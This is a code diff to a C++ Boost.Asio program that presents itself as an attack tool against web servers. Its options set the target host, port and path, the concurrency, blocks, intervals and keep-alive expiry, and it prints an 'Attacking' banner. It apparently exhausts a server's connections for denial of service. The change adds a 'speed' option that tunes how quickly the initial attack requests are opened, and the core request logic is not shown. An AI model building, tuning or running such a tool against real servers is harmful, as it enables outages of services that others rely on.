@@ -9,7 +9,7 @@ using namespace boost;
 using namespace asio;
 namespace po = boost::program_options;
 
-int concurrency, blocks, interval, expires;
+int concurrency, speed, blocks, interval, expires;
 string dest, port, location;
 bool debug;
 
@@ -86,7 +86,7 @@ void requestFactory(io_service* io, deadline_timer* timer, int id) {
 	new Request(*io, id++);
 
 	if(id < concurrency) {
-		timer->expires_from_now(posix_time::millisec(100));
+		timer->expires_from_now(posix_time::millisec(speed));
 		timer->async_wait(bind(requestFactory, io, timer, id));
 	}
 }
@@ -98,6 +98,7 @@ int main(int argc, char *argv[]) {
 		("port,p", po::value<string>(&port)->default_value("80"), "Attack port")
 		("location,l", po::value<string>(&location)->default_value("/"), "Attack location")
 		("concurrency,c", po::value<int>(&concurrency)->default_value(20), "Concurrency requests")
+		("speed,s", po::value<int>(&speed)->default_value(100), "Speed to create initial requests (millisec)")
 		("blocks,b", po::value<int>(&blocks)->default_value(10), "Blocks count")
 		("interval,i", po::value<int>(&interval)->default_value(5), "Interval between blocks")
 		("expires,e", po::value<int>(&expires)->default_value(5), "Expires for keep-alive connection")
@@ -127,7 +128,7 @@ int main(int argc, char *argv[]) {
 	io_service io;
 	deadline_timer timer(io);
 
-	cout << format("Attacking %1%:%2% %3% with concurrency=%4%, blocks=%5%, interval=%6%, expires=%7%, debug=%8%") % dest % port % location % concurrency % blocks % interval % expires % debug << endl << endl;
+	cout << format("Attacking %1%:%2% %3% with concurrency=%4%, speed=%5%, blocks=%6%, interval=%7%, expires=%8%, debug=%9%") % dest % port % location % concurrency % speed % blocks % interval % expires % debug << endl << endl;
 
 	requestFactory(&io, &timer, 0);
 	io.run();
